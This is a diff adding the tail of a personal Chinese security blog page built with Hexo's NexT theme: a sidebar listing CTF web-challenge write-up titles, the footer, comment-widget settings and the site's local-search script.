+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="w1ndy" />
+            
+              <p class="site-author-name" itemprop="name">w1ndy</p>
+              <p class="site-description motion-element" itemprop="description">时间从来不说话，却回答了所有问题</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+          
+          
+
+          
+          
+
+          
+          
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-text">[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安洵杯-2019-easy-serialize-php"><span class="nav-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-随便注-堆叠注入、预编译绕过"><span class="nav-text">[强网杯 2019]随便注(堆叠注入、预编译绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL-堆叠注入"><span class="nav-text">[SUCTF 2019]EasySQL(堆叠注入)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-text">[强网杯 2019]高明的黑客</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-text">[BUUCTF 2018]Online Tool</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-BuyFlag"><span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网鼎杯-2020-青龙组-AreUSerialz"><span class="nav-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-text">[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Upload"><span class="nav-text">[ACTF2020 新生赛]Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GKCTF2020-cve版签到"><span class="nav-text">[GKCTF2020]cve版签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GKCTF2020-CheckIN"><span class="nav-text">[GKCTF2020]CheckIN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安洵杯-2019-easy-web"><span class="nav-text">[安洵杯 2019]easy_web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-text">[ASIS 2019]Unicorn shop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF2020-Mark-loves-cat"><span class="nav-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="nav-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF2020-ZJCTF，不过如此"><span class="nav-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="nav-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MRCTF2020-Ez-bypass"><span class="nav-text">[MRCTF2020]Ez_bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-text">[GXYCTF2019]BabyUpload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MRCTF2020-你传你🐎呢"><span class="nav-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网鼎杯-2020-朱雀组-phpweb"><span class="nav-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF-2nd-Schrödinger"><span class="nav-text">[BJDCTF 2nd]Schrödinger</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF-2nd-duangShell"><span class="nav-text">[BJDCTF 2nd]duangShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MRCTF2020-PYWebsite"><span class="nav-text">[MRCTF2020]PYWebsite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF-2nd-elementmaster"><span class="nav-text">[BJDCTF 2nd]elementmaster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-RCE-ME"><span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网鼎杯-2020-朱雀组-Nmap"><span class="nav-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NPUCTF2020-ReadlezPHP"><span class="nav-text">[NPUCTF2020]ReadlezPHP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">
+  	w1ndy
+  </span>
+  
+</div>
+<!--
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数
+        */
+		var t1 = Date.UTC(2019,11,26,00,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+
+<div>
+	<a class="beian" target="_blank" href="https://beian.miit.gov.cn/" style="color:#555;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">陕ICP备********号</a>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '4E8wQUkAe7L6JRV6F3qUD9v7-MdYXbMMI# your leancloud application appid',
+        appKey: 'wt7SKkgYglRxxeJSr1fJvq7C# your leancloud application appkey',
+        placeholder: '欢迎留言',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'5' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/fireworks.js"></script>
+</body>
+</html>
